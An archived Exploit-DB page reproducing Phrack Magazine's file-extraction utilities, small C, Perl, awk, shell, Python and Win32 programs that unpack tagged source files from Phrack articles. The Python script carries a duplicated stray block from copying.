 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS&#039;&#039; AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *
 *  extract.c
 *  Extracts textfiles from a specially tagged flatfile into a hierarchical 
 *  directory structure.  Use to extract source code from any of the articles 
 *  in Phrack Magazine (first appeared in Phrack 50).
 *
 *  Extraction tags are of the form:
 *
 *  host:~&gt; cat testfile
 *  irrelevant file contents
 *  &lt;++&gt; path_and_filename1 !CRC32
 *  file contents
 *  &lt;--&gt;
 *  irrelevant file contents
 *  &lt;++&gt; path_and_filename2 !CRC32
 *  file contents
 *  &lt;--&gt;
 *  irrelevant file contents
 *  &lt;++&gt; path_and_filenamen !CRC32
 *  file contents
 *  &lt;--&gt;
 *  irrelevant file contents
 *  EOF
 *
 *  The `!CRC` is optional.  The filename is not.  To generate crc32 values 
 *  for your files, simply give them a dummy value initially.  The program
 *  will attempt to verify the crc and fail, dumping the expected crc value.
 *  Use that one.  i.e.:
 *
 *  host:~&gt; cat testfile
 *  this text is ignored by the program
 *  &lt;++&gt; testarooni !12345678
 *  text to extract into a file named testarooni
 *  as is this text
 *  &lt;--&gt; 
 *
 *  host:~&gt; ./extract testfile
 *  Opened testfile
 *   - Extracting testarooni
 *   crc32 failed (12345678 != 4a298f18)
 *  Extracted 1 file(s).  
 *
 *  You would use `4a298f18` as your crc value.
 *
 *  Compilation:
 *  gcc -o extract extract.c
 *  
 *  ./extract file1 file2 ... filen
 */


#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;string.h&gt;
#include &lt;dirent.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;

#define VERSION         &quot;7niner.20000430 revsion q&quot;

#define BEGIN_TAG       &quot;&lt;++&gt; &quot;
#define END_TAG         &quot;&lt;--&gt;&quot;
#define BT_SIZE         strlen(BEGIN_TAG)
#define ET_SIZE         strlen(END_TAG)
#define EX_DO_CHECKS    0x01
#define EX_QUIET        0x02

struct f_name
{
    u_char name[256];
    struct f_name *next;
};

unsigned long crcTable[256];


void crcgen() 
{
    unsigned long crc, poly;
    int i, j;
    poly = 0xEDB88320L;
    for (i = 0; i &lt; 256; i++)
    {
        crc = i;
        for (j = 8; j &gt; 0; j--)
        {
            if (crc &amp; 1)
            {
                crc = (crc &gt;&gt; 1) ^ poly;
            } 
            else
            {
                crc &gt;&gt;= 1;
            }
        }
        crcTable[i] = crc;
    }
}

        
unsigned long check_crc(FILE *fp)
{
    register unsigned long crc;
    int c;

    crc = 0xFFFFFFFF;
    while( (c = getc(fp)) != EOF )
    {
         crc = ((crc &gt;&gt; 8) &amp; 0x00FFFFFF) ^ crcTable[(crc ^ c) &amp; 0xFF];
    }
 
    if (fseek(fp, 0, SEEK_SET) == -1)
    {
        perror(&quot;fseek&quot;);
        exit(EXIT_FAILURE);
    }

    return (crc ^ 0xFFFFFFFF);
}


int
main(int argc, char **argv)
{ 
    char *name;
    u_char b[256], *bp, *fn, flags;
    int i, j = 0, h_c = 0, c;
    unsigned long crc = 0, crc_f = 0;
    FILE *in_p, *out_p = NULL;
    struct f_name *fn_p = NULL, *head = NULL, *tmp = NULL;

    while ((c = getopt(argc, argv, &quot;cqv&quot;)) != EOF)
    {
        switch (c)
        {
            case &#039;c&#039;:
                flags |= EX_DO_CHECKS;
                break;
            case &#039;q&#039;:
                flags |= EX_QUIET;
                break;
            case &#039;v&#039;:
                fprintf(stderr, &quot;Extract version: %s\n&quot;, VERSION);
                exit(EXIT_SUCCESS);
        }
    }
    c = argc - optind;

    if (c &lt; 2)
    {
        fprintf(stderr, &quot;Usage: %s [-cqv] file1 file2 ... filen\n&quot;, argv[0]);
        exit(0); 
    }

    /*
     *  Fill the f_name list with all the files on the commandline (ignoring
     *  argv[0] which is this executable).  This includes globs.
     */
    for (i = 1; (fn = argv[i++]); )
    {
        if (!head)
        {
            if (!(head = (struct f_name *)malloc(sizeof(struct f_name))))
            {
                perror(&quot;malloc&quot;);
                exit(EXIT_FAILURE);
            }
            strncpy(head-&gt;name, fn, sizeof(head-&gt;name));
            head-&gt;next = NULL;
            fn_p = head;
        }
        else
        {
            if (!(fn_p-&gt;next = (struct f_name *)malloc(sizeof(struct f_name))))
            {
                perror(&quot;malloc&quot;);
                exit(EXIT_FAILURE);
            }
            fn_p = fn_p-&gt;next;
            strncpy(fn_p-&gt;name, fn, sizeof(fn_p-&gt;name));
            fn_p-&gt;next = NULL;
        }
    }
    /*
     *  Sentry node.
     */
    if (!(fn_p-&gt;next = (struct f_name *)malloc(sizeof(struct f_name))))
    {
        perror(&quot;malloc&quot;);
        exit(EXIT_FAILURE);
     }
    fn_p = fn_p-&gt;next;
    fn_p-&gt;next = NULL;

    /*
     *  Check each file in the f_name list for extraction tags.
     */
    for (fn_p = head; fn_p-&gt;next; )
    {
        if (!strcmp(fn_p-&gt;name, &quot;-&quot;))
        {
            in_p = stdin;
            name = &quot;stdin&quot;;
        }
        else if (!(in_p = fopen(fn_p-&gt;name, &quot;r&quot;)))
        {
            fprintf(stderr, &quot;Could not open input file %s.\n&quot;, fn_p-&gt;name);
            fn_p = fn_p-&gt;next;
	    continue;
        }
        else
        {
            name = fn_p-&gt;name;
        }

        if (!(flags &amp; EX_QUIET))
        {
            fprintf(stderr, &quot;Scanning %s...\n&quot;, fn_p-&gt;name);
        }
        crcgen();
        while (fgets(b, 256, in_p))
        { 
            if (!strncmp(b, BEGIN_TAG, BT_SIZE))
            {
	        b[strlen(b) - 1] = 0;           /* Now we have a string. */
                j++;

                crc = 0;
                crc_f = 0;
                if ((bp = strchr(b + BT_SIZE + 1, &#039;/&#039;)))
                {
                    while (bp)
                    {
		        *bp = 0;
                        if (mkdir(b + BT_SIZE, 0700) == -1 &amp;&amp; errno != EEXIST)
                        {
                            perror(&quot;mkdir&quot;);
                            exit(EXIT_FAILURE);
                        }
                        *bp = &#039;/&#039;;
		        bp = strchr(bp + 1, &#039;/&#039;); 
		    }
                }

                if ((bp = strchr(b, &#039;!&#039;)))
                {
                    crc_f = 
                        strtoul((b + (strlen(b) - strlen(bp)) + 1), NULL, 16);
                   b[strlen(b) - strlen(bp) - 1 ] = 0;
                   h_c = 1;
                }
                else
                {
                    h_c = 0;
                }
                if ((out_p = fopen(b + BT_SIZE, &quot;wb+&quot;)))
                {
                    fprintf(stderr, &quot;. Extracting %s\n&quot;, b + BT_SIZE);
                }
                else
                {
        	    printf(&quot;. Could not extract anything from &#039;%s&#039;.\n&quot;,
                        b + BT_SIZE);
        	    continue;
                }
            }
            else if (!strncmp (b, END_TAG, ET_SIZE))
            {
                if (out_p)
                {
                    if (h_c == 1)
                    {
                        if (fseek(out_p, 0l, 0) == -1)
                        {
                            perror(&quot;fseek&quot;);
                            exit(EXIT_FAILURE);
                        }
                        crc = check_crc(out_p);
                        if (crc == crc_f &amp;&amp; !(flags &amp; EX_QUIET))
                        {
                            fprintf(stderr, &quot;. CRC32 verified (%08lx)\n&quot;, crc);
                        }
                        else
                        {
                            if (!(flags &amp; EX_QUIET))
                            {
                                fprintf(stderr, &quot;. CRC32 failed (%08lx != %08lx)\n&quot;,
                                        crc_f, crc);
                            }
                        }
                    }
                    fclose(out_p);
                }
	        else
                {
	            fprintf(stderr, &quot;. `%s` had bad tags.\n&quot;, fn_p-&gt;name);
		    continue;
	        }
            }
            else if (out_p)
            {
                fputs(b, out_p);
            }
        }
        if (in_p != stdin)
        {
            fclose(in_p);
        }
        tmp = fn_p;
        fn_p = fn_p-&gt;next;
        free(tmp);
    }
    if (!j)
    {
        printf(&quot;No extraction tags found in list.\n&quot;);
    }
    else
    {
        printf(&quot;Extracted %d file(s).\n&quot;, j);
    }
    return (0);
}
/* EOF */
&lt;--&gt;
&lt;++&gt; extract/extract.pl !1a19d427
# Daos &lt;daos@nym.alias.net&gt;
#!/bin/sh -- # -*- perl -*- -n
eval &#039;exec perl $0 -S ${1+&quot;$@&quot;}&#039; if 0;

$opening=0;

if (/^\&lt;\+\+\&gt;/) {$curfile = substr($_ , 5); $opening=1;};
if (/^\&lt;\-\-\&gt;/) {close ct_ex; $opened=0;}; 
if ($opening) {                        
        chop $curfile;                 
        $sex_dir= substr( $curfile, 0, ((rindex($curfile,&#039;/&#039;))) ) if ($curfile =~ m/\//);
        eval {mkdir $sex_dir, &quot;0777&quot;;}; 
        open(ct_ex,&quot;&gt;$curfile&quot;); 
        print &quot;Attempting extraction of $curfile\n&quot;;
        $opened=1; 
}
if ($opened &amp;&amp; !$opening) {print ct_ex $_}; 
&lt;--&gt;

&lt;++&gt; extract/extract.awk !26522c51
#!/usr/bin/awk -f
#
# Yet Another Extraction Script
# - &lt;sirsyko&gt;
#
/^\&lt;\+\+\&gt;/ {
        ind = 1
        File = $2
        split ($2, dirs, &quot;/&quot;)
        Dir=&quot;.&quot;
        while ( dirs[ind+1] ) {
                Dir=Dir&quot;/&quot;dirs[ind]
                system (&quot;mkdir &quot; Dir&quot; 2&gt;/dev/null&quot;)
                ++ind
        }
        next
}
/^\&lt;\-\-\&gt;/ {
        File = &quot;&quot;
        next
}
File { print &gt;&gt; File }
&lt;--&gt;
&lt;++&gt; extract/extract.sh !a81a2320
#!/bin/sh
# exctract.sh : Written 9/2/1997 for the Phrack Staff by &lt;sirsyko&gt;
#
# note, this file will create all directories relative to the current directory
# originally a bug, I&#039;ve now upgraded it to a feature since I dont want to deal
# with the leading / (besides, you dont want hackers giving you full pathnames
# anyway, now do you :)
# Hopefully this will demonstrate another useful aspect of IFS other than 
# haxoring rewt
#
# Usage: ./extract.sh &lt;filename&gt;

cat $* | (
Working=1
while [ $Working ];
do
        OLDIFS1=&quot;$IFS&quot;
        IFS=
        if read Line; then
                IFS=&quot;$OLDIFS1&quot;
                set -- $Line
                case &quot;$1&quot; in
                &quot;&lt;++&gt;&quot;) OLDIFS2=&quot;$IFS&quot;
                        IFS=/
                        set -- $2
                        IFS=&quot;$OLDIFS2&quot;
                        while [ $# -gt 1 ]; do
                                File=${File:-&quot;.&quot;}/$1
                                if [ ! -d $File ]; then
                                        echo &quot;Making dir $File&quot;
                                        mkdir $File
                                fi
                                shift
                        done                               
                        File=${File:-&quot;.&quot;}/$1
                        echo &quot;Storing data in $File&quot;
                ;;
                &quot;&lt;--&gt;&quot;) if [ &quot;x$File&quot; != &quot;x&quot; ]; then
                                unset File
                        fi ;;
                *)      if [ &quot;x$File&quot; != &quot;x&quot; ]; then
                                        IFS=
                                        echo &quot;$Line&quot; &gt;&gt; $File
                                        IFS=&quot;$OLDIFS1&quot;
                        fi
                ;;
                esac
                IFS=&quot;$OLDIFS1&quot;
        else
                echo &quot;End of file&quot;
                unset Working
        fi
done
)                                                                    
&lt;--&gt;
&lt;++&gt; extract/extract.py !83f65f60
#! /bin/env python
# extract.py    Timmy 2tone &lt;_spoon_@usa.net&gt;

import sys, string, getopt, os

class Datasink:
    &quot;&quot;&quot;Looks like a file, but doesn&#039;t do anything.&quot;&quot;&quot;
    def write(self, data): pass
    def close(self): pass

def extract(input, verbose = 1):
    &quot;&quot;&quot;Read a file from input until we find the end token.&quot;&quot;&quot;

    if type(input) == type(&#039;string&#039;):
        fname = input
        try: input = open(fname)
        except IOError, (errno, why):
            print &quot;Can&#039;t open %s: %s&quot; % (fname, why)
            return errno
    else:
        fname = &#039;&lt;file descriptor %d&gt;&#039; % input.fileno()

    inside_embedded_file = 0
    linecount = 0
    line = input.readline()
    while line:

        if not inside_embedded_file and line[:4] == &#039;&lt;++&gt;&#039;:

            inside_embedded_file = 1
            linecount = 0

            filename = string.strip(line[4:])
            if mkdirs_if_any(filename) != 0:
                pass

            try: output = open(filename, &#039;w&#039;)
            except IOError, (errno, why):
                print &quot;Can&#039;t open %s: %s; skipping file&quot; % (filename, why)
                output = Datasink()
                continue

            if verbose:
                print &#039;Extracting embedded file %s from %s...&#039; % (filename,
                                                                  fname),

        elif inside_embedded_file and line[:4] == &#039;&lt;--&gt;&#039;:
            output.close()
            inside_embedded_file = 0
            if verbose and not isinstance(output, Datasink):
                print &#039;[%d lines]&#039; % linecount

        elif inside_embedded_file:
            output.write(line)

        # Else keep looking for a start token.
        line = input.readline()
        linecount = linecount + 1

def mkdirs_if_any(filename, verbose = 1):
    &quot;&quot;&quot;Check for existance of /&#039;s in filename, and make directories.&quot;&quot;&quot;

    path, file = os.path.split(filename)
    if not path: return

    errno = 0
    start = os.getcwd()
    components = string.split(path, os.sep)
    for dir in components:
        if not os.path.exists(dir):
            try:
                os.mkdir(dir)
                if verbose: print &#039;Created directory&#039;, path

            except os.error, (errno, why):
                print &quot;Can&#039;t make directory %s: %s&quot; % (dir, why)
                break

        try: os.chdir(dir)
        except os.error, (errno, why):
            print &quot;Can&#039;t cd to directory %s: %s&quot; % (dir, why)
            break

    os.chdir(start)
    return errno

def usage():
    &quot;&quot;&quot;Blah.&quot;&quot;&quot;
    die(&#039;Usage: extract.py [-V] filename [filename...]&#039;)

def main():
    try: optlist, args = getopt.getopt(sys.argv[1:], &#039;V&#039;)
    except getopt.error, why: usage()
    if len(args) &lt;= 0: usage()

    if (&#039;-V&#039;, &#039;&#039;) in optlist: verbose = 0
    else: verbose = 1

    for filename in args:
        if verbose: print &#039;Opening source file&#039;, filename + &#039;...&#039;
        extract(filename, verbose)

def db(filename = &#039;P51-11&#039;):
    &quot;&quot;&quot;Run this script in the python debugger.&quot;&quot;&quot;
    import pdb
    sys.argv[1:] = [&#039;-v&#039;, filename]
    pdb.run(&#039;extract.main()&#039;)

def die(msg, errcode = 1):
    print msg
    sys.exit(errcode)

if __name__ == &#039;__main__&#039;:
    try: main()
    except KeyboardInterrupt: pass


    except getopt.error, why: usage()
    if len(args) &lt;= 0: usage()

    if (&#039;-V&#039;, &#039;&#039;) in optlist: verbose = 0
    else: verbose = 1

    for filename in args:
        if verbose: print &#039;Opening source file&#039;, filename + &#039;...&#039;
        extract(filename, verbose)

def db(filename = &#039;P51-11&#039;):
    &quot;&quot;&quot;Run this script in the python debugger.&quot;&quot;&quot;
    import pdb
    sys.argv[1:] = [filename]
    pdb.run(&#039;extract.main()&#039;)

def die(msg, errcode = 1):
    print msg
    sys.exit(errcode)

if __name__ == &#039;__main__&#039;:
    try: main()
    except KeyboardInterrupt: pass              # No messy traceback.
&lt;--&gt;
&lt;++&gt; extract/extract-win.c !e519375d
/***************************************************************************/
/* WinExtract                                                              */
/*                                                                         */
/* Written by Fotonik &lt;fotonik@game-master.com&gt;.                           */
/*                                                                         */
/* Coding of WinExtract started on 22aug98.                                */
/*                                                                         */
/* This version (1.0) was last modified on 22aug98.                        */
/*                                                                         */
/* This is a Win32 program to extract text files from a specially tagged   */
/* flat file into a hierarchical directory structure.  Use to extract      */
/* source code from articles in Phrack Magazine.  The latest version of    */
/* this program (both source and executable codes) can be found on my      */
/* website:  http://www.altern.com/fotonik                                 */
/***************************************************************************/


#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;windows.h&gt;


void PowerCreateDirectory(char *DirectoryName);


int WINAPI WinMain(HINSTANCE hThisInst, HINSTANCE hPrevInst,
                   LPSTR lpszArgs, int nWinMode)
{
OPENFILENAME OpenFile; /* Structure for Open common dialog box */
char InFileName[256]=&quot;&quot;;
char OutFileName[256];
char Title[]=&quot;WinExtract - Choose a file to extract files from.&quot;;
FILE *InFile;
FILE *OutFile;
char Line[256];
char DirName[256];
int FileExtracted=0;   /* Flag used to determine if at least one file was */
int i;                 /* extracted */

ZeroMemory(&amp;OpenFile, sizeof(OPENFILENAME));
OpenFile.lStructSize=sizeof(OPENFILENAME);
OpenFile.hwndOwner=HWND_DESKTOP;
OpenFile.hInstance=hThisInst;
OpenFile.lpstrFile=InFileName;
OpenFile.nMaxFile=sizeof(InFileName)-1;
OpenFile.lpstrTitle=Title;
OpenFile.Flags=OFN_FILEMUSTEXIST | OFN_HIDEREADONLY;

if(GetOpenFileName(&amp;OpenFile))
   {
   if((InFile=fopen(InFileName,&quot;r&quot;))==NULL)
      {
      MessageBox(NULL,&quot;Could not open file.&quot;,NULL,MB_OK);
      return 0;
      }

   /* If we got here, InFile is opened. */
   while(fgets(Line,256,InFile))
      {
      if(!strncmp(Line,&quot;&lt;++&gt; &quot;,5)) /* If line begins with &quot;&lt;++&gt; &quot; */
         {
         Line[strlen(Line)-1]=&#039;\0&#039;;
         strcpy(OutFileName,Line+5);

         /* Check if a dir has to be created and create one if necessary */
         for(i=strlen(OutFileName)-1;i&gt;=0;i--)
            {
            if((OutFileName[i]==&#039;\\&#039;)||(OutFileName[i]==&#039;/&#039;))
               {
               strncpy(DirName,OutFileName,i);
               DirName[i]=&#039;\0&#039;;
               PowerCreateDirectory(DirName);
               break;
               }
            }

         if((OutFile=fopen(OutFileName,&quot;w&quot;))==NULL)
            {
            MessageBox(NULL,&quot;Could not create file.&quot;,NULL,MB_OK);
            fclose(InFile);
            return 0;
            }

         /* If we got here, OutFile can be written to */
         while(fgets(Line,256,InFile))
            {
            if(strncmp(Line,&quot;&lt;--&gt;&quot;,4)) /* If line doesn&#039;t begin w/ &quot;&lt;--&gt;&quot; */
               {
               fputs(Line, OutFile);
               }
            else
               {
               break;
               }
            }
         fclose(OutFile);
         FileExtracted=1;
         }
      }
   fclose(InFile);
   if(FileExtracted)
      {
      MessageBox(NULL,&quot;Extraction sucessful.&quot;,&quot;WinExtract&quot;,MB_OK);
      }
   else
      {
      MessageBox(NULL,&quot;Nothing to extract.&quot;,&quot;Warning&quot;,MB_OK);
      }
   }
   return 1;
}


/* PowerCreateDirectory is a function that creates directories that are */
/* down more than one yet unexisting directory levels.  (e.g. c:\1\2\3) */
void PowerCreateDirectory(char *DirectoryName)
{
int i;
int DirNameLength=strlen(DirectoryName);
char DirToBeCreated[256];

for(i=1;i&lt;DirNameLength;i++) /* i starts at 1, because we never need to */
   {                         /* create &#039;/&#039; */
   if((DirectoryName[i]==&#039;\\&#039;)||(DirectoryName[i]==&#039;/&#039;)||
      (i==DirNameLength-1))
      {
      strncpy(DirToBeCreated,DirectoryName,i+1);
      DirToBeCreated[i+1]=&#039;\0&#039;;
      CreateDirectory(DirToBeCreated,NULL);
      }
   }
}
&lt;--&gt;

|=[ EOF ]=---------------------------------------------------------------=|



--------------------------------------------------------------------------------



            </code></pre>

                    </div>

                    <div class="card-footer">

                        <div class="row">

                            <div class="col">

                                <strong>Tags:</strong>

                                
                            </div>

                            <div class="col">

                                
                                
                            </div>

                            <div class="col">

                                <span class="float-right">

                                    <strong>Advisory/Source:</strong>

                                    <a href="http://phrack.org/archives/tgz/phrack60.tar.gz" target="_blank">
                                        Link
                                    </a>

                                </span>

                            </div>

                        </div>

                        <div class="row mt-3">

                            <div class="btn-group ml-2">

                                <a class="btn btn-primary btn-fab btn-icon btn-round"
                                   href="/papers/42870" aria-label="View Previous Paper"
                                   data-toggle="tooltip" data-placement="top" title="Previous Paper" >
                                    <i class="mdi mdi-arrow-left mdi-36px"></i>
                                </a>

                            </div>

                            <div class="col">

                                <div class="btn-group float-right">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/papers/42872" aria-label="View Next Paper"
                                       data-toggle="tooltip" data-placement="top" title="Next Paper" >
                                        <i class="mdi mdi-arrow-right mdi-36px"></i>
                                    </a>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                <div class="card">

                    <div class="card-footer">

    <div class="d-none d-lg-block">

        <div class="container-fluid">

            <table class="table table-borderless text-center">

                <thead style="background-color:#083257;">

                <tr class="text-white">
                        <th>
                            <strong>Downloads</strong>
                        </th>
                        <th>
                            <strong>Certifications</strong>
                        </th>
                        <th>
                            <strong>Training</strong>
                        </th>
                        <th>
                            <strong>Professional Services</strong>
                        </th>
                    </tr>

                </thead>

                <tbody>

                <tr class="text-center">
                    <td>
                        <a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                            Kali Linux
                        </a>
                    </td>
                    <td>
                        <a href="/pentest-training-with-kali-linux"
                           target="_blank" rel="noopener">OSCP
                        </a>
                    </td>
                    <td>
                        <a href="/pentest-training-with-kali-linux"
                           target="_blank" rel="noopener">Penetration Testing with Kali Linux (PWK) (PEN-200)
                           <br />All new for 2020
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/"
                           target="_blank" rel="noopener">Penetration Testing
                        </a>
                    </td>
                </tr>

                <tr class="text-center">
                    <td>
                        <a href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                           target="_blank" rel="noopener">
                            Kali NetHunter
                        </a>
                    </td>
                    <td>
                        <a href="/wireless-attacks-training"
                           target="_blank" rel="noopener">OSWP
                        </a>
                    </td>
                    <td>
                        <a href="/wireless-attacks-training"
                           target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/#other-services"
                           target="_blank" rel="noopener">Advanced Attack Simulation
                        </a>
                    </td>
                </tr>
                <tr>
                    <td>
                        <a href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                           target="_blank" rel="noopener">Kali Linux Revealed Book
                        </a>
                    </td>
                    <td>
                        <a href="/evasion-techniques-breaching-defenses"
                           target="_blank" rel="noopener">OSEP
                        </a>
                    </td>
                    <td>
                        <a href="/evasion-techniques-breaching-defenses"
                           target="_blank" rel="noopener">Evasion Techniques and Breaching Defences (PEN-300)
                           <br />All new for 2020
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/#asa"
                           target="_blank" rel="noopener">Application Security Assessment
                        </a>
                    </td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="/advanced-web-attacks"
                           target="_blank" rel="noopener">OSWE
                        </a>
                    </td>
                    <td>
                        <a href="/advanced-web-attacks"
                           target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                           <br />Updated for 2020
                        </a>
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="/windows-user-mode-exploit-development"
                           target="_blank" rel="noopener">OSED
                        </a>
                    </td>
                    <td>
                        <a href="/windows-user-mode-exploit-development"
                           target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                           <br />All new for 2021
                        </a>
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="https://www.offensive-security.com/awe-osee/"
                           target="_blank" rel="noopener">OSEE
                        </a>
                    </td>
                    <td>
<!--
                        <a href="https://www.offensive-security.com/metasploit-unleashed/"
                           target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                        </a>
-->
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="https://kali.training/"
                           target="_blank" rel="noopener">KLCP
                        </a>
                    </td>
                    <td>
                        <a href="https://kali.training/courses/kali-linux-revealed/"
                           target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                        </a>
                    </td>
                    <td></td>
                </tr>

                </tbody>

            </table>

        </div>

    </div>

    <div class="d-lg-none text-center">

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownDownloads" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Downloads
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownDownloads">

                <a class="dropdown-item" href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                    Kali Linux
                </a>
                <a class="dropdown-item"
                   href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                   target="_blank" rel="noopener">
                    Kali NetHunter
                </a>
                <a class="dropdown-item"
                   href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                   target="_blank" rel="noopener">
                    Kali Linux Revealed Book
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownCerts" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Certifications
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownCerts">

                <a class="dropdown-item"
                   href="/pentest-training-with-kali-linux"
                   target="_blank" rel="noopener">OSCP
                </a>
                <a class="dropdown-item"
                   href="/wireless-attacks-training"
                   target="_blank" rel="noopener">OSWP
                </a>
                <a class="dropdown-item"
                   href="/evasion-techniques-breaching-defenses"
                   target="_blank" rel="noopener">OSEP
                </a>
                <a class="dropdown-item"
                   href="/advanced-web-attacks"
                   target="_blank" rel="noopener">OSWE
                </a>
                <a class="dropdown-item"
                   href="/windows-user-mode-exploit-development"
                   target="_blank" rel="noopener">OSED
                </a>
                <a class="dropdown-item"
                   href="https://www.offensive-security.com/awe-osee/"
                   target="_blank" rel="noopener">OSEE
                </a>
                <a class="dropdown-item" href="https://kali.training/"
                   target="_blank" rel="noopener">KLCP
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownTraining" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Training
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownTraining">

                <a class="dropdown-item"
                   href="/pentest-training-with-kali-linux"
                   target="_blank" rel="noopener"> - Penetration Testing with Kali Linux (PWK) (PEN-200)
                   <br />All new for 2020
                </a>
                <a class="dropdown-item"
                   href="/wireless-attacks-training"
                   target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                </a>
                <a class="dropdown-item"
                   href="/evasion-techniques-breaching-defenses"
                   target="_blank" rel="noopener">Evasion Techniques and Breaching Defences (PEN-300)
                   <br />All new for 2020
                </a>
                <a class="dropdown-item"
                   href="/advanced-web-attacks"
                   target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                   <br />Updated for 2020
                </a>
                <a class="dropdown-item"
                   href="/windows-user-mode-exploit-development"
                   target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                   <br />All new for 2021
                </a>
<!--
                <a class="dropdown-item" href="https://www.offensive-security.com/metasploit-unleashed/"
                   target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                </a>
-->
                <a class="dropdown-item" href="https://kali.training/courses/kali-linux-revealed/" target="_blank"
                   target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownServices" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Pro Services
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownServices">

                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/"
                   target="_blank" rel="noopener">Penetration Testing
                </a>
                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/#other-services"
                   target="_blank" rel="noopener">Advanced Attack Simulation
                </a>
                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/#asa"
                   target="_blank" rel="noopener">Application Security Assessment
                </a>

            </div>

        </div>

    </div>

</div>

                </div>

            </div>

        </div>

    </div>


        
        <footer class="footer">

    <div class="container-fluid">

        <nav>

            <ul>

                <li>
                    <a href="https://twitter.com/exploitdb" target="_blank" aria-label="Exploit-DB Twitter" rel="noopener">

    <i class="mdi mdi-twitter mdi-36px"></i>

</a>


<a href="https://www.facebook.com/ExploitDB" target="_blank" aria-label="Exploit-DB Facebook" rel="noopener">

    <i class="mdi mdi-facebook mdi-36px"></i>
</a>

<a href="https://github.com/offensive-security/exploitdb" target="_blank" aria-label="Exploit-DB GitHub" rel="noopener">

    <i class="mdi mdi-github-circle mdi-36px"></i>
</a>                </li>

                <li>

                    <a href="/">
                        Exploit Database by Offensive Security
                    </a>

                </li>

                <li>

                    <a href="/terms">
                        Terms
                    </a>

                </li>

                <li>

                    <a href="/privacy">
                        Privacy
                    </a>

                </li>

                <li>

                    <a href="#" data-toggle="modal" data-target="#about">
                        About Us
                    </a>

                </li>

                <li>

                    <a href="/faq">
                        FAQ
                    </a>

                </li>

                <li>

                    <a href="/cookies">
                        Cookies
                    </a>

                </li>

            </ul>

        </nav>

        <div class="copyright mt-4">

            &copy;
            <a href="https://www.offensive-security.com/" target="_blank">OffSec Services Limited</a> 2021. All rights reserved.

        </div>

    </div>

    <!-- About EDB/GHDB Modal -->
<div class="modal fade bd-example-modal-lg" id="about" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

